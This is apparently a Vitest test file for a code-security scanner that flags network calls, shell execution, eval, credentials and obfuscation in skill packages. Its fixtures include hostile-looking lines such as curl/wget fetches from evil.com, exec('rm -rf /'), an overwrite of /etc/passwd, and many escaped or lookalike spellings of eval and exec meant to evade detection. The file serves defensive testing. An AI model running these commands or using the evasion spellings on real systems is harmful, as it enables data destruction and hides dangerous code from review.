import { describe, test, expect } from "vitest";
import {
  scanCode,
  analyzePermissions,
  stripControlBytes,
  METHOD_CALL_CATEGORY,
} from "./security-auditor-scan";
describe("scanCode", () => {
  test("detects curl usage", () => {
    const files = [
      {
        relPath: "SKILL.md",
        content: "Run: curl https://evil.com/payload",
        lineCount: 1,
      },
    ];
    const results = scanCode(files);
    const networkCat = results.find((r) => r.category === "Network requests");
    expect(networkCat).toBeDefined();
    expect(networkCat!.matches.some((m) => m.match.includes("curl"))).toBe(
      true,
    );
    expect(networkCat!.matches[0].severity).toBe("critical");
  });

  test("detects wget usage", () => {
    const files = [
      {
        relPath: "SKILL.md",
        content: "Run: wget https://evil.com/payload",
        lineCount: 1,
      },
    ];
    const results = scanCode(files);
    const networkCat = results.find((r) => r.category === "Network requests");
    expect(networkCat).toBeDefined();
    expect(networkCat!.matches.some((m) => m.match.includes("wget"))).toBe(
      true,
    );
  });

  test("detects exec usage", () => {
    const files = [
      {
        relPath: "script.js",
        content: "const result = exec('ls -la');",
        lineCount: 1,
      },
    ];
    const results = scanCode(files);
    const shellCat = results.find((r) => r.category === "Shell execution");
    expect(shellCat).toBeDefined();
    expect(shellCat!.matches[0].severity).toBe("critical");
  });

  test("detects child_process", () => {
    const files = [
      {
        relPath: "index.js",
        content: 'const { exec } = require("child_process");',
        lineCount: 1,
      },
    ];
    const results = scanCode(files);
    const shellCat = results.find((r) => r.category === "Shell execution");
    expect(shellCat).toBeDefined();
  });

  test("detects eval usage", () => {
    const files = [
      {
        relPath: "SKILL.md",
        content: "Use eval() to process dynamic input",
        lineCount: 1,
      },
    ];
    const results = scanCode(files);
    const codeCat = results.find(
      (r) => r.category === "Dynamic code execution",
    );
    expect(codeCat).toBeDefined();
    expect(codeCat!.matches[0].severity).toBe("critical");
  });

  test("detects external URLs (not github/localhost)", () => {
    const files = [
      {
        relPath: "SKILL.md",
        content: "Visit https://suspicious-site.com/api",
        lineCount: 1,
      },
    ];
    const results = scanCode(files);
    const urlCat = results.find((r) => r.category === "External URLs");
    expect(urlCat).toBeDefined();
  });

  test("does NOT flag github.com URLs as external", () => {
    const files = [
      {
        relPath: "SKILL.md",
        content: "Visit https://github.com/user/repo",
        lineCount: 1,
      },
    ];
    const results = scanCode(files);
    const urlCat = results.find((r) => r.category === "External URLs");
    expect(urlCat).toBeUndefined();
  });

  test("does NOT flag localhost URLs as external", () => {
    const files = [
      {
        relPath: "SKILL.md",
        content: "Visit https://localhost:3000/api",
        lineCount: 1,
      },
    ];
    const results = scanCode(files);
    const urlCat = results.find((r) => r.category === "External URLs");
    expect(urlCat).toBeUndefined();
  });

  test("detects embedded credentials", () => {
    const files = [
      {
        relPath: "config.ts",
        content: "API_KEY = 'sk-1234567890'",
        lineCount: 1,
      },
    ];
    const results = scanCode(files);
    const credCat = results.find((r) => r.category === "Embedded credentials");
    expect(credCat).toBeDefined();
    expect(credCat!.matches[0].severity).toBe("critical");
  });

  test("detects process.env access", () => {
    const files = [
      {
        relPath: "index.ts",
        content: "const key = process.env.OPENAI_KEY;",
        lineCount: 1,
      },
    ];
    const results = scanCode(files);
    const envCat = results.find(
      (r) => r.category === "Environment variable access",
    );
    expect(envCat).toBeDefined();
    expect(envCat!.matches[0].severity).toBe("info");
  });

  test("detects obfuscation patterns", () => {
    const files = [
      {
        relPath: "script.js",
        content: "const decoded = atob('c2VjcmV0');",
        lineCount: 1,
      },
    ];
    const results = scanCode(files);
    const obfCat = results.find((r) => r.category === "Obfuscation patterns");
    expect(obfCat).toBeDefined();
  });

  test("detects fetch() calls", () => {
    const files = [
      {
        relPath: "api.ts",
        content: "const res = await fetch('https://api.example.com');",
        lineCount: 1,
      },
    ];
    const results = scanCode(files);
    const networkCat = results.find((r) => r.category === "Network requests");
    expect(networkCat).toBeDefined();
    expect(networkCat!.matches.some((m) => m.severity === "warning")).toBe(
      true,
    );
  });

  test("returns empty array for clean content", () => {
    const files = [
      {
        relPath: "SKILL.md",
        content: `---
name: clean-skill
version: 1.0.0
---

# Clean Skill

This skill does simple text transformation.
No network calls, no shell commands, no eval.
`,
        lineCount: 10,
      },
    ];
    const results = scanCode(files);
    expect(results.length).toBe(0);
  });

  test("reports correct file and line number", () => {
    const files = [
      {
        relPath: "multi.md",
        content: "line 1\nline 2\ncurl http://evil.com\nline 4",
        lineCount: 4,
      },
    ];
    const results = scanCode(files);
    const networkCat = results.find((r) => r.category === "Network requests");
    expect(networkCat).toBeDefined();
    const curlMatch = networkCat!.matches.find((m) => m.match.includes("curl"));
    expect(curlMatch!.line).toBe(3);
    expect(curlMatch!.file).toBe("multi.md");
  });

  test("truncates long lines", () => {
    const longLine = "curl " + "a".repeat(200);
    const files = [{ relPath: "long.md", content: longLine, lineCount: 1 }];
    const results = scanCode(files);
    const networkCat = results.find((r) => r.category === "Network requests");
    expect(networkCat).toBeDefined();
    const match = networkCat!.matches[0];
    expect(match.match.length).toBeLessThanOrEqual(123); // 120 + "..."
  });

  test("scans multiple files", () => {
    const files = [
      { relPath: "a.md", content: "curl https://evil.com", lineCount: 1 },
      { relPath: "b.js", content: "eval('code')", lineCount: 1 },
    ];
    const results = scanCode(files);
    expect(results.length).toBeGreaterThanOrEqual(2);
    expect(results.some((r) => r.category === "Network requests")).toBe(true);
    expect(results.some((r) => r.category === "Dynamic code execution")).toBe(
      true,
    );
  });
});

// ─── analyzePermissions tests ───────────────────────────────────────────────

describe("analyzePermissions", () => {
  test("extracts shell permission from shell execution findings", () => {
    const scans = scanCode([
      { relPath: "SKILL.md", content: "exec('rm -rf /')", lineCount: 1 },
    ]);
    const perms = analyzePermissions(scans);
    expect(perms.some((p) => p.type === "shell")).toBe(true);
  });

  test("extracts network permission from curl/wget", () => {
    const scans = scanCode([
      { relPath: "SKILL.md", content: "curl https://evil.com", lineCount: 1 },
    ]);
    const perms = analyzePermissions(scans);
    expect(perms.some((p) => p.type === "network")).toBe(true);
  });

  test("extracts filesystem permission from writeFile", () => {
    const scans = scanCode([
      {
        relPath: "script.js",
        content: "writeFile('/etc/passwd', 'hacked')",
        lineCount: 1,
      },
    ]);
    const perms = analyzePermissions(scans);
    expect(perms.some((p) => p.type === "filesystem")).toBe(true);
  });

  test("extracts code-execution permission from eval", () => {
    const scans = scanCode([
      { relPath: "SKILL.md", content: "eval(userInput)", lineCount: 1 },
    ]);
    const perms = analyzePermissions(scans);
    expect(perms.some((p) => p.type === "code-execution")).toBe(true);
  });

  test("extracts environment permission from process.env", () => {
    const scans = scanCode([
      {
        relPath: "config.ts",
        content: "const key = process.env.KEY;",
        lineCount: 1,
      },
    ]);
    const perms = analyzePermissions(scans);
    expect(perms.some((p) => p.type === "environment")).toBe(true);
  });

  test("returns empty for clean code", () => {
    const scans = scanCode([
      { relPath: "SKILL.md", content: "This is clean code.", lineCount: 1 },
    ]);
    const perms = analyzePermissions(scans);
    expect(perms.length).toBe(0);
  });

  test("includes reason for each permission", () => {
    const scans = scanCode([
      { relPath: "SKILL.md", content: "exec('ls')", lineCount: 1 },
    ]);
    const perms = analyzePermissions(scans);
    const shellPerm = perms.find((p) => p.type === "shell");
    expect(shellPerm).toBeDefined();
    expect(shellPerm!.reason).toBeTruthy();
    expect(shellPerm!.reason.length).toBeGreaterThan(0);
  });

  test("sorts permissions by risk (shell first)", () => {
    const scans = scanCode([
      {
        relPath: "SKILL.md",
        content: "process.env.KEY\ncurl http://a.com\nexec('ls')",
        lineCount: 3,
      },
    ]);
    const perms = analyzePermissions(scans);
    if (perms.length >= 2) {
      const shellIdx = perms.findIndex((p) => p.type === "shell");
      const envIdx = perms.findIndex((p) => p.type === "environment");
      if (shellIdx !== -1 && envIdx !== -1) {
        expect(shellIdx).toBeLessThan(envIdx);
      }
    }
  });
});

// ─── calculateVerdict tests ─────────────────────────────────────────────────

// ─── Real-call matchers (#809) ──────────────────────────────────────────────

// Must stay critical: each reaches the language's builtin.
const mustFail: Array<[string, string]> = [
  ["run.py", "result = eval(user_input)"],
  ["run.py", "exec(code)"],
  ["run.py", "    value = eval (expr)"],
  ["run.py", "builtins.eval(src)"],
  ["run.py", "__builtins__.exec(src)"],
  ["run.py", "__import__('builtins').exec(code)"],
  ["run.py", '__import__("builtins").eval(src)'],
  ["run.js", "const parts = [...eval(code)];"],
  ["run.js", "run(...exec(cmd))"],
  ["run.js", "const out = eval(x);"],
  ["run.js", "const f = new Function(x);"],
  ["run.js", "const f = Function('return 1');"],
  ["run.js", "window.eval(x)"],
  ["run.js", "globalThis.eval(x)"],
  ["run.js", "self.eval(x)"],
  ["run.js", "window.Function(x)()"],
  ["run.js", "if (eval(x)) {"],
  // A ternary branch is a call, not a method body (review of #809).
  ["run.js", "const cfg = c ? eval(src) : {};"],
  ["run.js", "x = c ? exec(cmd) : {}"],
  ["run.js", "f = c ? Function(code) : {}"],
  ["run.js", "p = c ? spawn(cmd) : {}"],
  ["run.js", "  ? eval(src) : {}"],
  ["run.js", "r = c ? eval(src) : null || {}"],
  ["run.js", "exec('rm -rf /tmp/x')"],
  ["run.js", "cp.exec(cmd)"],
  ["run.js", "child_process.exec(cmd)"],
  ["run.js", "spawn('sh', ['-c', cmd])"],
  ["run.js", "cp.spawn('sh')"],
  ["run.py", "child = pexpect.spawn(cmd)"],
  // A ternary wrapped so the call opens the line: `: {` is its else
  // branch, never a return type (fix round 1 of #809).
  ["run.js", "  eval(p) : {};"],
  ["run.ts", "  eval(p) : { a: 1 };"],
  ["run.js", "  exec(c): {}"],
  ["run.ts", "  exec(c): {}"],
  ["run.js", "  Function(p) : {}"],
  ["run.ts", "  Function(p) : {}"],
  ["run.mts", "  Function(p) : {}"],
  ["run.js", "\teval(x)\t: {}"],
  ["run.js", "  spawn(cmd) : {}"],
  ["run.ts", "  spawn(cmd) : {}"],
  // A return type is TS-only, and without a modifier only a plain name.
  ["run.js", "  eval(p) : Foo {"],
  ["run.ts", "  eval(p) : a<b>{}"],
  ["run.ts", "  eval(p) : a.b<c>{}"],
  // The receiver on the line before may be the global object.
  ["run.js", "  .eval(p);"],
  ["run.js", ".eval(p);"],
  ["run.ts", "\t.eval(p)"],
  ["run.js", "  ?.eval(p)"],
  ["run.js", "  .Function(p)()"],
  ["run.py", "    .eval(src)"],
  // B1 (round 2): an expression keyword after `:` is an else-branch.
  ["run.ts", "  eval(p) : void {};"],
  ["run.ts", "  eval(p) : typeof {};"],
  ["run.ts", "  eval(p) : class {};"],
  ["run.ts", "  eval(p) : new {};"],
  ["run.ts", "  exec(c) : void {};"],
  ["run.tsx", "  eval(p) : void {};"],
  ["run.ts", "  eval(p) : void {};\r"],
  // B2 (round 2): outside .py/.js/.mjs/.cjs/.ts/.tsx/.mts/.cts, the rule
  // before #809 applies unchanged: Ruby block calls and receivers, Java.
  ["run.rb", "eval(payload) {}"],
  ["run.rb", "exec(cmd) { }"],
  ["run.rb", "spawn(cmd) {}"],
  ["run.rb", "Kernel.exec(cmd)"],
  ["run.rb", 'Process.exec("ls")'],
  ["run.rb", "binding.eval(code)"],
  ["run.rb", "Kernel.eval(code)"],
  ["run.rb", "TOPLEVEL_BINDING.eval(code)"],
  ["Run.java", "Runtime.getRuntime().exec(cmd);"],
  ["run.pyw", "    def eval(self, e):"],
  ["run.pyc", "self.eval(x)"],
  // B3 (round 2): only an identifier receiver is exempt.
  ["run.js", "(globalThis).eval(x);"],
  ["run.js", "globalThis/**/.eval(x);"],
  ["run.py", 'importlib.import_module("builtins").exec(code)'],
  ["render.py", "Browser().eval(expr)"],
  ["match.js", "getRe().exec(s)"],
  // `\r` ends a line in JS and Python: a call, then a block or a receiver
  // on the line before (CodeRabbit on fix round 3).
  ["run.js", "eval(payload)\r{}"],
  ["run.ts", "eval(payload)\r{}"],
  ["run.js", "  exec(cmd)\u2028{}"],
  ["run.ts", "  eval(p) :\r Foo {"],
  ["run.js", "browser\r  .eval(x)"],
  // B4 (round 3): CR, LS or PS after `def`/`function` ends the line, so the
  // name that follows is a call, not a definition.
  ["run.js", 'var def\reval("1");'],
  ["run.js", 'var def\u2028eval("1");'],
  ["run.js", 'var def\u2029eval("1");'],
  ["run.js", 'var def\rFunction("1")();'],
  ["run.js", "var def\rspawn('ls');"],
  ["run.py", 'function = 0\rfunction\reval("1")\r'],
  ["run.py", 'function = 0\rfunction\rexec("1")\r'],
  // B5 (round 3): a global spelled with a JS `\u` escape or a Python
  // NFKC-equivalent character is still that global.
  ["run.js", "glob\\u0061lThis.eval(x);"],
  ["run.js", "\\u{67}lobalThis.eval(x);"],
  ["run.js", "win\\u0064ow.eval(x);"],
  ["run.js", "\\u0073elf.eval(x);"],
  ["run.js", "glob\\u0061lThis.Function(x)();"],
  ["run.ts", "glob\\u0061lThis.eval(x);"],
  ["run.js", "\\u0063p.exec(cmd);"],
  ["run.py", "\uff42uiltins.exec(code)"],
  ["run.py", "__\uff42uiltins__.eval(code)"],
  ["run.py", "\u{1d41b}uiltins.eval(code)"],
];

// Method-shaped: definitions and calls on an identifier receiver. A warning
// under METHOD_CALL_CATEGORY, never critical (#809).
const mustPass: Array<[string, string]> = [
  ["render.py", "    def eval(self, expression):"],
  ["render.py", "    async def eval(self, expression: str) -> str:"],
  ["render.py", 'if self.eval("window.__ready === true"):'],
  ["render.py", 'browser.eval("document.title")'],
  ["render.py", "    def exec(self, sql):"],
  ["db.py", "cursor.execute(query)"],
  ["db.py", "self.exec(sql)"],
  ["match.js", "const m = re.exec(line);"],
  ["match.js", "while ((m = /a(b)/g.exec(s)) !== null) {}"],
  ["page.js", "await page.eval(selector)"],
  ["page.js", "obj?.eval(x)"],
  ["engine.js", "function eval(node) {"],
  ["engine.js", "  eval(node) {"],
  ["engine.ts", "  async eval(node: Node): Promise<Value> {"],
  ["engine.js", "  exec(command) {"],
  ["engine.ts", "  static eval(node): Value {"],
  ["engine.ts", "  private exec(sql: string): Promise<Row[]> {"],
  ["engine.js", "  Function(name) {"],
  ["engine.js", "this.eval(node)"],
  ["engine.py", "def Function(name):"],
  ["pool.py", "    def spawn(self, n):"],
  ["pool.js", "function spawn(worker) {"],
  // TS methods with a plain return type, and no-annotation methods.
  ["engine.ts", "  eval(node): Value {"],
  ["engine.ts", "  eval(node: Node): ast.Value {"],
  ["engine.ts", "  exec(sql): Row[] {"],
  ["engine.tsx", "  Function(name): Fn {"],
  ["engine.ts", "  spawn(n): Worker {"],
  ["engine.ts", "  eval(x) {"],
  ["engine.ts", "  public eval(x): Map<string, number> {"],
  ["engine.ts", "  async eval(x): Promise<A | B> {"],
  // A receiver on the same line, even with a space before `.`.
  ["page.js", "browser .eval(x)"],
  ["page.js", "browser\t?.eval(x)"],
  // The AC1 alias residual: a line regex cannot tell these from `obj.eval`.
  ["run.js", "g.eval(x);"],
  ["run.js", "this.eval(x);"],
  ["run.js", "top.eval(x);"],
  ["run.js", "window.parent.eval(code);"],
  ["run.py", "b.exec(code)"],
  // An escaped or NFKC spelling of a non-global receiver is still a method.
  ["page.js", "bro\\u0077ser.eval(x)"],
  ["engine.ts", "\\u0074his.eval(node)"],
  ["render.py", "\uff53elf.eval(x)"],
];

describe("dynamic execution: real calls only (#809)", () => {
  const critical = (relPath: string, content: string) =>
    scanCode([{ relPath, content, lineCount: 1 }])
      .filter(
        (c) =>
          c.category === "Dynamic code execution" ||
          c.category === "Shell execution",
      )
      .flatMap((c) => c.matches)
      .filter((m) => m.severity === "critical");

  const method = (relPath: string, content: string) =>
    scanCode([{ relPath, content, lineCount: 1 }])
      .filter((c) => c.category === METHOD_CALL_CATEGORY)
      .flatMap((c) => c.matches);

  test.each(mustFail)("flags %s: %s", (relPath, line) => {
    expect(critical(relPath, line).length).toBeGreaterThan(0);
  });

  test.each(mustPass)("only warns on %s: %s", (relPath, line) => {
    expect(critical(relPath, line)).toEqual([]);
    if (MAIN_RULES.some((re) => re.test(line))) {
      expect(method(relPath, line).map((m) => m.severity)).toContain("warning");
    }
  });

  test("the issue repro: the method is a warning, a call on Browser() stays critical", () => {
    const content = [
      "class Browser:",
      "    def eval(self, expression):",
      '        return self.send("Runtime.evaluate", {"expression": expression})',
      "",
      'Browser().eval("window.ready === true")',
    ].join("\n");
    const results = scanCode([
      { relPath: "scripts/render.py", content, lineCount: 5 },
    ]);
    const dynamic = results.find(
      (r) => r.category === "Dynamic code execution",
    );
    // `Browser()` is not an identifier receiver, so it may be the builtin.
    expect(dynamic!.matches.map((m) => [m.line, m.severity])).toEqual([
      [5, "critical"],
    ]);
    const warn = results.find((r) => r.category === METHOD_CALL_CATEGORY);
    expect(warn!.matches.map((m) => [m.line, m.severity])).toEqual([
      [2, "warning"],
    ]);
    // A warning grants no code-execution permission.
    expect(analyzePermissions([warn!]).map((p) => p.type)).not.toContain(
      "code-execution",
    );
  });

  test("appstore-assets' CDP wrapper is warnings only, so not dangerous", () => {
    const content = [
      'if self.eval("window.__ready === true"):',
      "    def eval(self, expression: str):",
      'browser.eval(f"window.__seek({t})")',
      'FONT = "https://fonts.googleapis.com/css2?family=Inter"',
    ].join("\n");
    const results = scanCode([
      { relPath: "scripts/render.py", content, lineCount: 4 },
    ]);
    expect(results.flatMap((r) => r.matches).map((m) => m.severity)).toEqual([
      "warning",
      "warning",
      "warning",
      "warning",
    ]);
    expect(analyzePermissions(results).map((p) => p.type)).toEqual(["network"]);
  });

  test("a real call on the same file as a method is still flagged", () => {
    const content = "def eval(self, e):\n    return eval(e)\n";
    const results = scanCode([{ relPath: "x.py", content, lineCount: 2 }]);
    const cat = results.find((r) => r.category === "Dynamic code execution");
    expect(cat!.matches.map((m) => m.line)).toEqual([2]);
    expect(analyzePermissions(results).map((p) => p.type)).toContain(
      "code-execution",
    );
  });
});

// The rules before #809, copied here (not imported) so the invariant test
// checks the new code against main's behaviour, not against itself.
const MAIN_RULES = [
  /\bexec\s*\(/,
  /\bspawn\s*\(/,
  /\beval\s*\(/,
  /\bFunction\s*\(/,
];

describe("invariant: every line main flags is still reported (#809)", () => {
  // Every probe from the review rounds of #809, multi-line ones included.
  const probes: Array<[string, string]> = [
    ["p.py", "eval(x)\nexec(x)\nexec (x)\neval (x)"],
    [
      "p.py",
      "import builtins\nbuiltins.eval(x)\n__import__('builtins').exec(x)",
    ],
    ["p.py", "getattr(__builtins__, 'eval')(x)\ncode = compile(x, '', 'exec')"],
    ["p.py", "f = eval if c else y\npexpect.spawn(cmd)"],
    ["p.js", "eval(x);\nwindow.eval(x);\nglobalThis.eval(x);\nself.eval(x);"],
    ["p.js", "const f = new Function(x);\nFunction(x)();\n(0, eval)(x);"],
    ["p.js", "const r = c ? eval(x) : 0;\nf(...[eval(x)]);"],
    ["p.js", "require('child_process').exec(cmd);\ncp.spawn(cmd);"],
    ["p.js", "const r = ok ?\n  eval(p) : {};\nglobalThis\n  .eval(p);"],
    ["p.js", "const r = ok ?\n  Function(p) : {};\nwindow\n?.eval(x);"],
    ["p.ts", "const r = ok ?\n  eval(p) : { a: 1 };\nwindow\n  ?.eval(x);"],
    ["p.ts", "const r = ok ?\n  eval(x): {};\nconst s = ok ?\n  eval(x) :{};"],
    ["p.ts", "const r = ok ?\n  eval(p) : void {};\n  eval(p) : typeof {};"],
    [
      "p.ts",
      "  eval(p) : class {};\n  eval(p) : new {};\n  exec(c) : void {};",
    ],
    ["p.ts", "const r = ok ?\n  Function(p)() : void {};"],
    ["p.tsx", "const r = ok ?\n  eval(p) : void {};"],
    ["p.ts", "const r = ok ?\r\n  eval(p) : void {};\r\n"],
    ["p.js", "const r = ok ?\r\n  eval(p) : {};\r\nglobalThis\r\n  .eval(p);"],
    ["p.js", "const r = ok ?\r  eval(p) : {};\rglobalThis\r  .eval(p);"],
    ["p.js", "const s = `${eval(x)}`;\nconst t = `\n${eval(x)}`;"],
    ["p.mjs", "const r = ok ?\n  eval(p) : {};\nFunction(x)();"],
    [
      "p.cjs",
      "eval(x);\nglobalThis\n  .eval(p);\nconst r = ok ?\n  exec(c) : {};",
    ],
    ["p.mjs", "class A {\n  eval(x) {\n    return x;\n  }\n}"],
    ["p.ts", "class A {\n  async eval(x: string): Promise<T> {\n  }\n}"],
    ["p.ts", "class A {\r\n  eval(x: string): string {\r\n  }\r\n}"],
    ["p.py", "class B:\r\n    def eval(self, e):\r\n        return e"],
    ["p.py", "x = 1\r\neval(x)\r\n"],
    ["p.pyc", "x = 1\r\neval(x)\r\n"],
    ["p.pyo", "eval(x)"],
    ["p.rb", "eval(payload) {}\nexec(cmd) { }\nspawn(cmd) {}"],
    ["p.rb", 'Kernel.exec(cmd)\nProcess.exec("ls")\nbinding.eval(code)'],
    ["p.rb", "Kernel.eval(code)\nTOPLEVEL_BINDING.eval(code)\ndef eval(x)"],
    ["P.java", "Runtime.getRuntime().exec(cmd);"],
    ["p.js", "(globalThis).eval(x);\nglobalThis/**/.eval(x);"],
    ["p.py", 'importlib.import_module("builtins").exec(code)'],
    ["p.js", "const g = globalThis;\ng.eval(x);\nthis.eval(x);\ntop.eval(x);"],
    [
      "p.js",
      "window.parent.eval(code);\nconst proc = require('child_process');\nproc.exec(cmd);",
    ],
    ["p.py", "import builtins as b\nb.exec(code)"],
    ["p.py", "import builtins\nbuiltins \\\n    .eval(x)"],
    [
      "p.py",
      "class B:\n    def eval(self, e):\n        return e\nself.eval(x)",
    ],
    ["p.py", "browser.eval(x)\ncursor.execute(q)\nBrowser().eval(x)"],
    [
      "p.js",
      "browser.eval(x);\nawait page.evaluate(() => 1);\nconst m = re.exec(s);",
    ],
    ["p.js", "const m = regex.exec(s);\ndb.exec(sql);\n// child.exec(cmd)"],
    ["p.py", 'msg = "do not eval this"\nmsg = "never call eval(x) here"'],
    ["p.js", "eval/**/(x);\neval\n(x);\neval?.(x);"],
    ...mustFail,
    ...mustPass,
  ];

  test.each(probes)("%s: %j", (relPath, content) => {
    const reported = new Map<number, string[]>();
    for (const c of scanCode([{ relPath, content, lineCount: 1 }])) {
      for (const m of c.matches) {
        reported.set(m.line, [...(reported.get(m.line) ?? []), m.severity]);
      }
    }
    content.split("\n").forEach((line, i) => {
      if (!MAIN_RULES.some((re) => re.test(line))) return;
      const severities = reported.get(i + 1) ?? [];
      // At least a warning; never only `info`, never nothing.
      expect(
        severities.filter((s) => s === "critical" || s === "warning"),
        `${relPath}:${i + 1} ${line}`,
      ).not.toEqual([]);
    });
  });
});

describe("control bytes in findings (#809)", () => {
  test("a finding never carries NUL, escape or other control bytes", () => {
    const content = "abc\0\0eval(\x01\x1b[31mX\x7f\x9b";
    const results = scanCode([{ relPath: "blob.js", content, lineCount: 1 }]);
    const match = results.flatMap((r) => r.matches)[0];
    expect(match).toBeDefined();
    // eslint-disable-next-line no-control-regex
    expect(match.match).not.toMatch(/[\x00-\x08\x0a-\x1f\x7f-\x9f]/);
    expect(match.match).toBe("abc??eval(??[31mX??");
  });

  test("a file name never carries control bytes (#809)", () => {
    const [cat] = scanCode([
      { relPath: "e\x1b[31mvil\x07.py", content: "eval(x)", lineCount: 1 },
    ]);
    expect(cat.matches[0].file).toBe("e?[31mvil?.py");
  });

  test("tabs are kept", () => {
    expect(stripControlBytes("a\tb\0c")).toBe("a\tb?c");
  });
});
